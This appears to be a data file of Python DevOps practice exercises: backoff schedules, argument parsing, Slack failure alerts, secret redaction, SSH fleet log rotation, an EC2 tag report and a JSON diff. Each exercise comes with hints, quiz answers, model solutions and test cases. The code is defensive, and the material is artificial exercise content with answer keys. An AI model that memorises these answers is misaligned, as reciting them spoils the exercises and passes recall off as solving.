      a: `<p>Create one repository with the <code>src/opstools/</code> package (the three modules, each exposing <code>main(argv=None)</code>), a <code>tests/</code> folder, and a <code>pyproject.toml</code> declaring name, version, <code>requires-python</code>, dependencies with lower bounds, a <code>test</code> extra, and three <code>[project.scripts]</code> entries. Each CLI gets <code>--version</code> from <code>importlib.metadata</code>. CI runs <code>pip install -e ".[test]" &amp;&amp; pytest</code> on every pull request and tags releases. Servers install a pinned tag with pipx under the service user; cron calls the stable <code>~/.local/bin/</code> path. Rollback is reinstalling the previous tag.</p>`,
      code: `# Layout
# opstools/
#   pyproject.toml
#   src/opstools/__init__.py
#   src/opstools/_version.py        (helper below)
#   src/opstools/clean_snapshots.py (main(argv=None) -> int)
#   src/opstools/rotate_logs.py
#   src/opstools/ensure_tags.py
#   tests/test_clean_snapshots.py ...

# src/opstools/_version.py
from importlib.metadata import PackageNotFoundError, version


def tool_version() -> str:
    try:
        return version("opstools")
    except PackageNotFoundError:
        return "0.0.0+dev"


# In each module's parse_args():
#   p.add_argument("--version", action="version", version=f"%(prog)s {tool_version()}")

# pyproject.toml (key parts):
#   [project]
#   name = "opstools"
#   version = "1.4.0"
#   requires-python = ">=3.11"
#   dependencies = ["boto3>=1.34", "pyyaml>=6.0", "requests>=2.32"]
#   [project.optional-dependencies]
#   test = ["pytest>=8", "moto[ec2,s3]>=5"]
#   [project.scripts]
#   snapclean = "opstools.clean_snapshots:main"
#   rotate-logs = "opstools.rotate_logs:main"
#   ensure-tags = "opstools.ensure_tags:main"

# On a server, as the ops user:
#   pipx install "git+https://github.com/acme/opstools@v1.4.0"
#   snapclean --version            -> snapclean 1.4.0
# Upgrade / roll back:
#   pipx install --force "git+https://github.com/acme/opstools@v1.4.1"`,
      cx: `<p>One-time setup of about 30 lines of config. Afterwards every install is one command, every server runs a known version, and tests guard every release.</p>`,
      f: ['How would you ship the same toolkit as a container image for an ECS scheduled task?', 'When would you rewrite one of these tools in Go instead?']
    })]
  });

  // ───────────────────────── Practice: Easy ─────────────────────────
  practice.push(P({
    t: 'Backoff delay schedule with a cap', l: 'Easy', tags: ['retries', 'backoff', 'pure function'], co: ['Amazon', 'Google', 'Paytm'], c: PURE,
    s: `<p>Write <code>backoff_delays(retries, base, cap)</code> that returns the list of waits (in seconds) a client uses before each of its <code>retries</code> retries, without jitter: retry <i>i</i> (counting from 0) waits <code>min(cap, base × 2<sup>i</sup>)</code>. Zero retries gives an empty list. These are the upper bounds that full jitter then randomises.</p>`,
    ex: `<p><code>backoff_delays(6, 1, 8)</code> → ${H.c('g', '[1, 2, 4, 8, 8, 8]')}: doubling until the cap of 8 s, then flat. Total worst-case wait 31 s, which is the number you add to the job timeout.</p>`,
    bw: `<p>A fixed <code>time.sleep(1)</code> between retries: during an outage every client hammers the API once per second and keeps it down. Doubling without a cap is the opposite bug: retry 12 would wait over an hour.</p>`,
    bc: `def backoff_delays(retries, base, cap):
    return [base * 2 ** i for i in range(retries)]    # no cap: 2**20 seconds is 12 days`,
    q: ['Why add jitter on top of these delays?', ['So many clients that failed together do not retry at the same instant', 'To make retries faster on average', 'Because the cap is not precise', 'To satisfy TLS'], 0, 'Without jitter, clients synchronise into waves that hit the recovering service together (a "thundering herd"). Randomising each wait spreads the load.'],
    h: ['<p>Hint 1: one value per retry, so loop <code>for i in range(retries)</code>.</p>', '<p>Hint 2: compute <code>base * 2 ** i</code>, then clamp with <code>min(cap, ...)</code>.</p>', '<p>Hint 3: return floats; with base 0.5 the first value is 0.5. <code>retries = 0</code> naturally gives <code>[]</code>.</p>'],
    a: `<p>Exponential backoff doubles the wait after each failure, so a short blip costs little while a long outage quickly backs clients off. The cap keeps waits bounded so a job does not sleep for hours. Keeping the schedule as a function makes it easy to log ("will retry in 4 s") and to assert in tests. In production, pass each value through <code>random.uniform(0, d)</code> (full jitter) before sleeping.</p>`,
    code: `def backoff_delays(retries, base, cap):
    """Upper-bound waits before each retry: min(cap, base * 2**i)."""
    return [float(min(cap, base * 2 ** i)) for i in range(retries)]`,
    cx: `<p>O(retries) time and space.</p>`,
    f: ['Write the full-jitter version with an injectable <code>random.Random</code> so tests stay deterministic.', 'What is the worst-case total wait for 10 retries with base 0.5 and cap 20?'],
    tests: { sig: 'int double double -> double[]', fn: 'backoffDelays', cmp: 'float', cases: [
      [[5, 1, 30], [1, 2, 4, 8, 16]], [[0, 1, 30], []], [[4, 0.5, 3], [0.5, 1, 2, 3]], [[1, 2, 10], [2]],
      [[6, 1, 8], [1, 2, 4, 8, 8, 8]], [[3, 0.1, 100], [0.1, 0.2, 0.4]], [[3, 5, 4], [4, 4, 4]]
    ] }
  }));

  practice.push(P({
    t: 'Argument parsing for a destructive cleanup tool', l: 'Easy', tags: ['argparse', 'dry run', 'safety', 'pure function'], co: ['Microsoft', 'Infosys', 'Cred'], c: PURE,
    s: `<p>Write <code>parse_cleanup_args(argv)</code> using <code>argparse</code> for a cleanup tool with: <code>--region</code> (required), <code>--days</code> (int, default 30, must be ≥ 1), <code>--apply</code> and <code>--yes</code> flags (<code>--apply</code> without <code>--yes</code> is an error; <code>--yes</code> alone is harmless), and <code>--tag-key</code>, which may be repeated. Return <code>["region=R", "days=D", "mode=apply|dry-run", "tags=K1,K2"]</code>. On any usage error return <code>["error"]</code> (catch argparse's <code>SystemExit</code>).</p>`,
    ex: `<p><code>parse_cleanup_args(["--region", "us-east-1", "--days", "7", "--apply", "--yes"])</code> → ${H.c('g', '["region=us-east-1", "days=7", "mode=apply", "tags="]')}. <code>["--region", "eu-west-1", "--apply"]</code> → ${H.c('r', '["error"]')}: deleting needs the explicit confirmation.</p>`,
    bw: `<p>Reading <code>sys.argv</code> by position (<code>region = sys.argv[1]</code>), with "delete" as the default and a <code>--dry-run</code> flag to opt out. One forgotten flag in a cron line and the tool deletes for real; one swapped argument and it runs against the wrong region.</p>`,
    bc: `import sys

def parse_cleanup_args(argv):
    region, days = argv[0], int(argv[1])         # positional guesswork, crashes on bad input
    return [f"region={region}", f"days={days}", "mode=apply", "tags="]   # deletes by default`,
    q: ['Why is <code>--apply</code> plus <code>--yes</code> safer than a <code>--dry-run</code> flag?', ['Forgetting a flag then means "do nothing" instead of "delete"', 'It is shorter to type', 'argparse cannot parse --dry-run', 'It runs faster'], 0, 'Safe defaults fail closed. With --dry-run as opt-in, a missing flag (cron, copy-paste, a new colleague) deletes. With --apply --yes required, a missing flag just prints a plan.'],
    h: ['<p>Hint 1: <code>action="store_true"</code> for flags, <code>action="append", default=[]</code> for the repeated <code>--tag-key</code>.</p>', '<p>Hint 2: cross-field rules (apply needs yes, days ≥ 1) go after <code>parse_args</code> as <code>p.error(...)</code>, which raises <code>SystemExit(2)</code> like any argparse error.</p>', '<p>Hint 3: wrap parsing in <code>try/except SystemExit</code> and return <code>["error"]</code>. argparse also accepts <code>--days=14</code> style, for free.</p>'],
    a: `<p>Declare every option with a type and default so the rest of the program only sees clean values; argparse handles <code>--opt value</code> and <code>--opt=value</code>, rejects unknown flags and bad ints, and prints help. Rules involving several options are checked right after parsing with <code>p.error()</code>, so they behave exactly like built-in errors (usage message, exit code 2). The default mode is dry run. In the real tool you would not catch <code>SystemExit</code>; here it lets a test observe the error.</p>`,
    code: `import argparse


def parse_cleanup_args(argv):
    p = argparse.ArgumentParser(prog="cleanup")
    p.add_argument("--region", required=True)
    p.add_argument("--days", type=int, default=30)
    p.add_argument("--apply", action="store_true")
    p.add_argument("--yes", action="store_true")
    p.add_argument("--tag-key", action="append", default=[])
    try:
        a = p.parse_args(argv)
        if a.days < 1:
            p.error("--days must be at least 1")
        if a.apply and not a.yes:
            p.error("--apply requires --yes")
    except SystemExit:
        return ["error"]
    return [f"region={a.region}", f"days={a.days}",
            f"mode={'apply' if a.apply else 'dry-run'}", "tags=" + ",".join(a.tag_key)]`,
    cx: `<p>O(n) in the number of arguments.</p>`,
    f: ['Make <code>--region</code> default to the <code>AWS_REGION</code> environment variable but still be required if neither is set.', 'Add a mutually exclusive <code>--older-than</code>/<code>--before-date</code> pair.'],
    tests: { sig: 'string[] -> string[]', fn: 'parseCleanupArgs', cases: [
      [[['--region', 'eu-west-1']], ['region=eu-west-1', 'days=30', 'mode=dry-run', 'tags=']],
      [[['--region', 'us-east-1', '--days', '7', '--apply', '--yes']], ['region=us-east-1', 'days=7', 'mode=apply', 'tags=']],
      [[['--days', '7']], ['error']],
      [[['--region', 'eu-west-1', '--apply']], ['error']],
      [[['--region', 'eu-west-1', '--days', 'abc']], ['error']],
      [[['--region', 'eu-west-1', '--days', '0']], ['error']],
      [[['--region', 'eu-west-1', '--tag-key', 'Owner', '--tag-key', 'Env']], ['region=eu-west-1', 'days=30', 'mode=dry-run', 'tags=Owner,Env']],
      [[['--days=14', '--region=ap-south-1']], ['region=ap-south-1', 'days=14', 'mode=dry-run', 'tags=']],
      [[['--region', 'eu-west-1', '--yes']], ['region=eu-west-1', 'days=30', 'mode=dry-run', 'tags=']]
    ] }
  }));

  practice.push(P({
    t: 'Slack alert when a nightly job fails', l: 'Easy', tags: ['webhook', 'alerts', 'secrets', 'urllib'], co: ['Slack', 'Zomato', 'Wipro'],
    s: `<p>A nightly backup job sometimes fails silently. Write a wrapper <code>notify_on_failure.py -- &lt;command...&gt;</code> that runs the command with a timeout, and if it exits non-zero or times out, posts a short message to Slack (or a Teams Workflows webhook): job name, host, exit code and the last 10 lines of stderr. The webhook URL comes from <code>SLACK_WEBHOOK_URL</code>. The wrapper must exit with the job's own exit code, and a broken webhook must never hide the original failure.</p>`,
    ex: `<p><code>notify_on_failure.py --name db-backup -- /opt/backup.sh</code>, and backup.sh exits 3 → Slack shows ${H.c('r', ':red_circle: db-backup failed on db-01 (exit 3) ... last stderr lines ...')} and the wrapper exits ${H.c('r', '3')}, so cron and monitoring still see the failure.</p>`,
    bw: `<p>Hardcoding the webhook URL in the script (anyone with repo access can post to the channel, and it leaks into forks and logs), using <code>shell=True</code> with the command string, and exiting 0 after sending the alert, which turns a failed job into a "successful" one for every other tool.</p>`,
    q: ['The webhook POST itself fails (Slack is down). What should the wrapper do?', ['Log the alert failure to stderr and still exit with the job\'s exit code', 'Exit 0 because the job is not the wrapper\'s problem', 'Retry forever until Slack answers', 'Raise and exit with the HTTP error code'], 0, 'Alerting is best effort. The job\'s result is the important signal; swallowing or replacing it would hide the real failure from cron, systemd and monitoring.'],
    h: ['<p>Hint 1: everything after <code>--</code> is the command: use <code>argparse.REMAINDER</code> or <code>nargs=argparse.REMAINDER</code>, and run it as a list.</p>', '<p>Hint 2: capture stderr with <code>subprocess.run(..., capture_output=True, text=True, timeout=...)</code>; on <code>TimeoutExpired</code> treat the exit code as 124 like the <code>timeout</code> command.</p>', '<p>Hint 3: build the payload with <code>json.dumps({"text": ...})</code>, POST with <code>urllib.request</code> and a 5 s timeout inside <code>try/except OSError</code>; return the job\'s exit code from <code>main()</code>.</p>'],
    a: `<p>Run the job as a list of arguments with a timeout, capture its output, and pass stdout/stderr through so cron logs still see them. On failure, compose a short message (job, host, exit code, tail of stderr; never the environment or secrets) and POST it to the webhook URL read from the environment. Alert errors are logged and ignored. The wrapper always exits with the job's code (124 on timeout), so it can be dropped in front of any existing cron line without changing how failures are detected.</p>`,
    code: `#!/usr/bin/env python3
"""notify_on_failure.py --name NAME [--timeout SEC] -- COMMAND [ARGS...]"""
import argparse
import json
import os
import socket
import subprocess
import sys
import urllib.request


def post_alert(text):
    url = os.environ.get("SLACK_WEBHOOK_URL")            # secret: set by cron env file / systemd / CI
    if not url:
        print("notify: SLACK_WEBHOOK_URL not set, alert skipped", file=sys.stderr)
        return
    req = urllib.request.Request(url, data=json.dumps({"text": text}).encode(), method="POST",
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=5):
            pass
    except OSError as e:
        print(f"notify: alert failed: {e}", file=sys.stderr)   # never print the URL


def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("--name", required=True)
    p.add_argument("--timeout", type=int, default=3600)
    p.add_argument("command", nargs=argparse.REMAINDER)
    args = p.parse_args(argv)
    cmd = args.command[1:] if args.command[:1] == ["--"] else args.command
    if not cmd:
        p.error("give the command after --")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout)
        code, err = r.returncode, r.stderr
        sys.stdout.write(r.stdout)
        sys.stderr.write(r.stderr)
    except subprocess.TimeoutExpired as e:
        # e.stderr can be bytes even with text=True, so decode defensively
        err = e.stderr.decode(errors="replace") if isinstance(e.stderr, bytes) else (e.stderr or "")
        code = 124
        err += f"\\n(timed out after {args.timeout}s)"
    except FileNotFoundError:
        code, err = 127, f"command not found: {cmd[0]}"
    if code != 0:
        tail = "\\n".join(err.strip().splitlines()[-10:])
        post_alert(f":red_circle: {args.name} failed on {socket.gethostname()} (exit {code})\\n\`\`\`{tail}\`\`\`")
    return code


if __name__ == "__main__":
    sys.exit(main())`,
    cx: `<p>One extra HTTP call, only on failure. The wrapper adds no measurable time to successful runs.</p>`,
    f: ['How would you avoid sending 30 identical alerts when the job fails every minute?', 'What changes if the alert must go to PagerDuty instead (dedup keys, severity)?']
  }));

  practice.push(P({
    t: 'Redact secrets from log lines', l: 'Easy', tags: ['security', 'regex', 'logging', 'pure function'], co: ['GitHub', 'Okta', 'HDFC Bank'], c: PURE,
    s: `<p>Before shipping script logs to a central system, mask secrets. Write <code>redact(line)</code> applying, in this order:</p>
      <ol><li><code>Bearer &lt;value&gt;</code> (case-insensitive "bearer") → <code>Bearer [REDACTED]</code>, keeping the original spelling of the word;</li>
      <li>a key whose name <b>ends with</b> <code>token</code>, <code>password</code>, <code>secret</code> or <code>api_key</code> (case-insensitive; names are letters, digits and <code>_</code>, so <code>db_password</code> and <code>GITHUB_TOKEN</code> count), followed by optional spaces, <code>=</code> or <code>:</code>, optional spaces and a value of non-space characters → value replaced by <code>[REDACTED]</code>;</li>
      <li>AWS access key ids: <code>AKIA</code> or <code>ASIA</code> followed by 16 uppercase letters or digits, as a whole word → <code>[REDACTED-KEY]</code>.</li></ol>`,
    ex: `<p><code>redact("user=bob password=hunter2 ok")</code> → ${H.c('g', '"user=bob password=[REDACTED] ok"')}. <code>redact("nothing secret here")</code> stays unchanged: "secret" is not followed by <code>=</code> or <code>:</code>.</p>`,
    bw: `<p>Replacing a fixed list of known secret values (<code>line.replace(my_token, "***")</code>). It only hides secrets you already know about, misses new or rotated ones, and requires the script to hold every secret just to hide it. Pattern-based redaction catches the shapes instead.</p>`,
    bc: `def redact(line):
    return line.replace("password", "********")     # hides the word, leaves the actual password`,
    q: ['Where is redaction best applied in a Python tool?', ['In a logging.Filter or formatter, so every handler gets masked text', 'In each print() call by hand', 'Only in the central log system', 'In the shell after the script finishes'], 0, 'A logging filter applies to every record from every module, including libraries. Doing it by hand misses lines; doing it downstream means the secret already left the machine.'],
    h: ['<p>Hint 1: use <code>re.sub</code> with groups so you can keep the key and separator and replace only the value: <code>r"\\1\\2[REDACTED]"</code>.</p>', '<p>Hint 2: key pattern: <code>[A-Za-z0-9_]*(?:token|password|secret|api_key)</code> with <code>re.IGNORECASE</code>, then <code>(\\s*[=:]\\s*)</code>, then <code>\\S+</code>.</p>', '<p>Hint 3: the AWS key pattern is <code>\\b(?:AKIA|ASIA)[0-9A-Z]{16}\\b</code>; apply it last. Do the Bearer rule first so the token after "Bearer" is masked even when the header name is "Authorization".</p>'],
    a: `<p>Three regex substitutions, each keeping context and replacing only the sensitive value, so the log line stays readable for debugging ("password=[REDACTED]" tells you a password was present). Case-insensitive key matching catches <code>TOKEN</code>, <code>Api_Key</code> and env-style names. In a real tool, put this in a <code>logging.Filter</code> that rewrites <code>record.msg</code> after formatting, and still avoid logging secrets in the first place: redaction is the safety net, not the plan.</p>`,
    code: `import re

BEARER = re.compile(r"(bearer\\s+)\\S+", re.IGNORECASE)
KEYVAL = re.compile(r"([A-Za-z0-9_]*(?:token|password|secret|api_key))(\\s*[=:]\\s*)\\S+", re.IGNORECASE)
AWSKEY = re.compile(r"\\b(?:AKIA|ASIA)[0-9A-Z]{16}\\b")


def redact(line):
    line = BEARER.sub(r"\\1[REDACTED]", line)
    line = KEYVAL.sub(r"\\1\\2[REDACTED]", line)
    return AWSKEY.sub("[REDACTED-KEY]", line)`,
    cx: `<p>O(L) per line of length L; three linear regex passes.</p>`,
    f: ['Wrap this in a <code>logging.Filter</code> and attach it to the root logger.', 'How would you detect high-entropy strings (random-looking tokens) that match no known pattern?'],
    tests: { sig: 'string -> string', fn: 'redact', cases: [
      [['user=bob password=hunter2 ok'], 'user=bob password=[REDACTED] ok'],
      [['Authorization: Bearer abc.def.ghi'], 'Authorization: Bearer [REDACTED]'],
      [['key AKIAIOSFODNN7EXAMPLE used'], 'key [REDACTED-KEY] used'],
      [['TOKEN: xyz123'], 'TOKEN: [REDACTED]'],
      [['nothing secret here'], 'nothing secret here'],
      [['api_key=k1 api_key=k2'], 'api_key=[REDACTED] api_key=[REDACTED]'],
      [['db_password=pw GITHUB_TOKEN=ghp_abc'], 'db_password=[REDACTED] GITHUB_TOKEN=[REDACTED]'],
      [['session ASIAABCDEFGHIJKLMNOP expired'], 'session [REDACTED-KEY] expired'],
      [['curl -H "authorization: bearer t0k"'], 'curl -H "authorization: bearer [REDACTED]'],
      [['AKIA123 is too short'], 'AKIA123 is too short']
    ] }
  }));

  // ───────────────────────── Practice: Medium ─────────────────────────
  practice.push(P({
    t: 'Rotate logs on 50 servers in batches with a failure budget', l: 'Medium', tags: ['subprocess', 'ssh', 'concurrent.futures', 'log rotation'], co: ['Amazon', 'Oracle', 'Tata Communications'],
    s: `<p>Run <code>rotate_logs.py --apply --yes</code> on every host of the <code>web</code> group (from the YAML inventory) over SSH. Requirements: at most 10 hosts at a time; each host gets a 120 s timeout; dry run by default (the remote command gets <code>--apply --yes</code> only when the wrapper itself gets <code>--apply --yes</code>); if more than 3 hosts fail, stop starting new hosts (a failure budget, so a bad release does not hit the whole fleet); print a per-host summary and exit 1 if any host failed.</p>`,
    ex: `<p>50 hosts, hosts 12, 13, 17 and 21 unreachable → after the 4th failure no new hosts start, the in-flight ones finish, and the summary shows ${H.c('g', '31 OK')}, ${H.c('r', '4 FAIL')}, ${H.c('y', '15 not started (failure budget exceeded)')}, exit code 1.</p>`,
    bw: `<p>A bash <code>for h in $(cat hosts); do ssh $h ...; done</code>: serial (50 × 20 s ≈ 17 minutes), no timeout (one hung host blocks the rest forever), and no stop condition, so a broken command runs on every single server before anyone notices.</p>`,
    q: ['Why use threads (not processes) for the SSH fan-out?', ['The work is waiting on the network; threads are cheap and the GIL is released while waiting', 'Processes cannot run ssh', 'Threads are always faster than processes', 'SSH requires a single process'], 0, 'I/O-bound fan-out spends almost all its time blocked in subprocess and socket waits, so a thread pool scales fine and shares the failure counter easily.'],
    h: ['<p>Hint 1: <code>ThreadPoolExecutor(max_workers=10)</code>; submit hosts one at a time from a loop so you can stop submitting when the budget is exceeded.</p>', '<p>Hint 2: keep at most <code>max_workers</code> futures in flight with <code>concurrent.futures.wait(..., return_when=FIRST_COMPLETED)</code>, update counters as each finishes.</p>', '<p>Hint 3: use <code>ssh -o BatchMode=yes -o ConnectTimeout=5</code> so a password prompt or dead host fails fast, plus <code>timeout=120</code> in <code>subprocess.run</code>.</p>'],
    a: `<p>Load the host list from the inventory (reusing the group expansion), then feed hosts into a bounded pool. Keep a set of in-flight futures; whenever one completes, record its result, and only submit a new host if the failure count is still within budget. This gives you a rolling window of 10 and a clean stop: in-flight hosts finish, nothing new starts. Every host's outcome lands in one of three buckets (OK, FAIL, not started), which makes the summary and the exit code obvious. Dry run is the default, and the remote flags are added only when the operator confirmed locally.</p>`,
    code: `#!/usr/bin/env python3
"""fleet_rotate.py --inventory inventory.yaml --group web [--apply --yes] [--budget 3]"""
import argparse
import subprocess
import sys
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait

import yaml

from opstools.inventory import hosts_of, index_groups      # from the JSON/YAML topic


def rotate_on(host, apply):
    cmd = ["sudo", "/usr/local/bin/rotate-logs", "/var/log/myapp", "--keep", "7"]
    if apply:
        cmd += ["--apply", "--yes"]
    try:
        r = subprocess.run(["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=5", host, *cmd],
                           capture_output=True, text=True, timeout=120)
        return host, r.returncode == 0, (r.stderr or r.stdout).strip()[-200:]
    except subprocess.TimeoutExpired:
        return host, False, "timeout after 120 s"


def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("--inventory", required=True)
    p.add_argument("--group", required=True)
    p.add_argument("--workers", type=int, default=10)
    p.add_argument("--budget", type=int, default=3, help="max failed hosts before stopping")
    p.add_argument("--apply", action="store_true")
    p.add_argument("--yes", action="store_true")
    args = p.parse_args(argv)
    if args.apply and not args.yes:
        p.error("--apply needs --yes")

    with open(args.inventory, encoding="utf-8") as f:
        hosts = hosts_of(index_groups(yaml.safe_load(f)), args.group)
    ok, failed, pending = [], [], list(hosts)
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        running = set()
        while pending or running:
            while pending and len(running) < args.workers and len(failed) <= args.budget:
                running.add(pool.submit(rotate_on, pending.pop(0), args.apply))
            if not running:
                break                                         # budget exceeded: stop starting hosts
            done, running = wait(running, return_when=FIRST_COMPLETED)
            for fut in done:
                host, success, msg = fut.result()
                (ok if success else failed).append(host)
                print(f"{'OK  ' if success else 'FAIL'} {host} {'' if success else msg}", flush=True)
    print(f"mode={'APPLY' if args.apply else 'DRY RUN'} ok={len(ok)} failed={len(failed)} "
          f"not_started={len(pending)}{' (failure budget exceeded)' if pending else ''}")
    return 1 if failed or pending else 0


if __name__ == "__main__":
    sys.exit(main())`,
    cx: `<p>Wall time ≈ (hosts / workers) × per-host time: 50 hosts at 20 s each with 10 workers ≈ 100 s instead of about 17 minutes.</p>`,
    f: ['How would you do a canary: one host first, then 10%, then the rest?', 'When would you switch this to Ansible instead of a Python fan-out?']
  }));

  practice.push(P({
    t: 'Report untagged EC2 instances in every region', l: 'Medium', tags: ['boto3', 'pagination', 'regions', 'compliance'], co: ['Amazon', 'Deloitte', 'Ola'],
    s: `<p>Finance wants a weekly CSV of running or stopped EC2 instances that lack an <code>Owner</code> or <code>CostCenter</code> tag, across <b>all enabled regions</b> of account 123456789012. Columns: region, instance id, type, state, launch date, missing tags. Use the default credential chain (an SSO profile locally, a role in CI), pagination everywhere, server-side filters where possible, and regions in parallel. The script is read-only.</p>`,
    ex: `<p>Output <code>untagged-2026-10-19.csv</code>:<br><code>region,instance_id,type,state,launched,missing</code><br><code>eu-west-1,i-0abc...,t3.large,running,2026-03-02,CostCenter</code><br><code>us-east-1,i-0def...,m6i.xlarge,stopped,2025-11-20,Owner;CostCenter</code></p>`,
    bw: `<p>One <code>describe_instances()</code> call in the default region only. It misses every other region (where forgotten test machines usually live) and every instance past the first page, and the report looks clean when it is not.</p>`,
    q: ['How should the script get its region list?', ['<code>ec2.describe_regions()</code> (only regions enabled for the account)', 'A hardcoded list from a blog post', 'Only the region in the profile', '<code>boto3.Session().get_available_regions("ec2")</code> without checking opt-in status'], 0, 'describe_regions returns the regions enabled for the account by default, including opt-in regions you turned on. Static lists go stale; get_available_regions lists regions the SDK knows, including ones not enabled.'],
    h: ['<p>Hint 1: <code>Filters=[{"Name": "instance-state-name", "Values": ["running", "stopped"]}]</code> on the paginator reduces data before it reaches you.</p>', '<p>Hint 2: convert the AWS tag list to a dict, then <code>missing = [k for k in REQUIRED if not tags.get(k)]</code>.</p>', '<p>Hint 3: one client per region inside each worker; collect rows from all workers, sort them, write with <code>csv.writer</code>. Catch <code>ClientError</code> per region (for example an SCP that denies a region) and keep going.</p>'],
    a: `<p>Ask EC2 for the enabled regions, then scan each region in a small thread pool. Each worker builds its own client with standard retries and pages through <code>describe_instances</code> with a state filter, flattening reservations into instances and computing which required tags are missing or empty. Region-level errors are recorded, not fatal, so one denied region does not lose the whole report. Rows are sorted for stable diffs and written as CSV. Because it only reads, the role needs just <code>ec2:DescribeRegions</code> and <code>ec2:DescribeInstances</code>.</p>`,
    code: `#!/usr/bin/env python3
"""untagged_report.py [--profile sandbox] [--out untagged.csv] - read-only."""
import argparse
import csv
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import date

import boto3
from botocore.config import Config
from botocore.exceptions import ClientError

REQUIRED = ("Owner", "CostCenter")
CFG = Config(retries={"mode": "standard", "max_attempts": 10})


def scan_region(session, region):
    ec2 = session.client("ec2", region_name=region, config=CFG)
    rows = []
    pages = ec2.get_paginator("describe_instances").paginate(
        Filters=[{"Name": "instance-state-name", "Values": ["running", "stopped"]}])
    for page in pages:
        for res in page["Reservations"]:
            for i in res["Instances"]:
                tags = {t["Key"]: t["Value"] for t in i.get("Tags", [])}
                missing = [k for k in REQUIRED if not tags.get(k)]
                if missing:
                    rows.append([region, i["InstanceId"], i["InstanceType"], i["State"]["Name"],
                                 i["LaunchTime"].date().isoformat(), ";".join(missing)])
    return rows


def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("--profile")
    p.add_argument("--out", default=f"untagged-{date.today().isoformat()}.csv")
    args = p.parse_args(argv)
    session = boto3.Session(profile_name=args.profile)
    regions = [r["RegionName"] for r in session.client("ec2", region_name="us-east-1").describe_regions()["Regions"]]

    rows, errors = [], []

    def safe_scan(region):
        try:
            # a Session is not thread-safe, so each worker builds its own (clients are thread-safe)
            return scan_region(boto3.Session(profile_name=args.profile), region)
        except ClientError as e:
            errors.append(f"{region}: {e.response['Error']['Code']}")
            return []

    with ThreadPoolExecutor(max_workers=6) as pool:
        for region_rows in pool.map(safe_scan, regions):
            rows.extend(region_rows)
    rows.sort()
    with open(args.out, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["region", "instance_id", "type", "state", "launched", "missing"])
        w.writerows(rows)
    print(f"{len(rows)} non-compliant instance(s) in {len(regions)} region(s) -> {args.out}")
    for e in errors:
        print("WARN region skipped:", e, file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())`,
    cx: `<p>One paginated scan per region; with 6 workers, 17 regions take roughly three times the slowest region's time. API calls ≈ pages per region, reduced by the server-side state filter.</p>`,
    f: ['How would you run this across every account in the AWS Organization?', 'AWS Config and Resource Explorer can answer this too. When would you prefer them?']
  }));

  practice.push(P({
    t: 'Diff two JSON configs by path', l: 'Medium', tags: ['json', 'config drift', 'recursion', 'pure function'], co: ['Spotify', 'Uber', 'Myntra'], c: PURE,
    s: `<p>Write <code>json_diff(a_json, b_json)</code> that compares two JSON objects (top level is always an object) and reports what changed from <code>a</code> to <code>b</code>. Flatten nested objects into dotted paths (<code>retention.days</code>). Non-object values, lists and <b>empty objects</b> are leaves compared as a whole. Render values with <code>json.dumps(v, sort_keys=True)</code>. Return lines sorted by path:</p>
      <ul><li><code>+ path=value</code> only in b;</li><li><code>- path</code> only in a;</li><li><code>~ path: old -&gt; new</code> in both with different values.</li></ul>`,
    ex: `<p><code>json_diff('{"name": "x", "on": true}', '{"name": "y", "on": false, "new": null}')</code> → ${H.c('g', '[\'~ name: "x" -&gt; "y"\', "+ new=null", "~ on: true -&gt; false"]')}. Paths sort as text: name, new, on.</p>`,
    bw: `<p>Comparing the two files as text (<code>a_text == b_text</code> or a line diff). Key order and whitespace changes show up as differences, and a real change deep inside a nested object appears as a confusing multi-line hunk without saying which setting moved.</p>`,
    bc: `import json

def json_diff(a_json, b_json):
    a, b = json.loads(a_json), json.loads(b_json)
    return [f"~ {k}" for k in a if a.get(k) != b.get(k)]     # top level only, ignores added keys`,
    q: ['Why render values with <code>json.dumps</code> in the output?', ['So strings, numbers, booleans and null are unambiguous (\'"1"\' vs 1, null vs "None")', 'Because print cannot show dicts', 'To make it faster', 'To sort the paths'], 0, 'Python\'s str() would show True/None and drop quotes, so "1" and 1 would look identical. JSON rendering keeps types visible, which matters when debugging config drift.'],
    h: ['<p>Hint 1: write <code>flatten(obj, prefix)</code> that returns a dict path → leaf, recursing only into <b>non-empty</b> dicts.</p>', '<p>Hint 2: diff the two flat dicts over <code>sorted(set(fa) | set(fb))</code>.</p>', '<p>Hint 3: compare leaves with <code>!=</code> (lists compare element-wise); render with <code>json.dumps(v, sort_keys=True)</code>. A key that is an object in a and a number in b shows up as removals of the old paths plus an addition.</p>'],
    a: `<p>Flattening turns a nested comparison into a simple dictionary diff with precise, greppable paths, the same idea Terraform plans and Kubernetes diff tools use. Empty objects are kept as leaves so adding the first key under them is visible as a structural change. Sorting the output makes the diff deterministic for tests and code review. Use it to detect drift between the config in Git and what a service reports at runtime.</p>`,
    code: `import json


def flatten(obj, prefix=""):
    out = {}
    for key, value in obj.items():
        path = f"{prefix}.{key}" if prefix else key
        if isinstance(value, dict) and value:
            out.update(flatten(value, path))
        else:
            out[path] = value
    return out


def json_diff(a_json, b_json):
    fa, fb = flatten(json.loads(a_json)), flatten(json.loads(b_json))
    show = lambda v: json.dumps(v, sort_keys=True)
    lines = []
    for path in sorted(set(fa) | set(fb)):
        if path not in fa:
            lines.append(f"+ {path}={show(fb[path])}")
        elif path not in fb:
            lines.append(f"- {path}")
        elif fa[path] != fb[path]:
            lines.append(f"~ {path}: {show(fa[path])} -> {show(fb[path])}")
    return lines`,
    cx: `<p>O(N log N) for N leaf paths (flattening is linear, sorting dominates).</p>`,
    f: ['How would you show list changes element by element (<code>servers[2]</code>)?', 'How would you mask values for paths containing "password" in the output?'],
    tests: { sig: 'string string -> string[]', fn: 'jsonDiff', cases: [
      [['{"region": "eu-west-1", "retention": {"days": 30}}', '{"region": "eu-west-1", "retention": {"days": 14}}'], ['~ retention.days: 30 -> 14']],
      [['{}', '{"a": 1}'], ['+ a=1']],
      [['{"a": {"b": 1, "c": 2}}', '{"a": {"b": 1}}'], ['- a.c']],
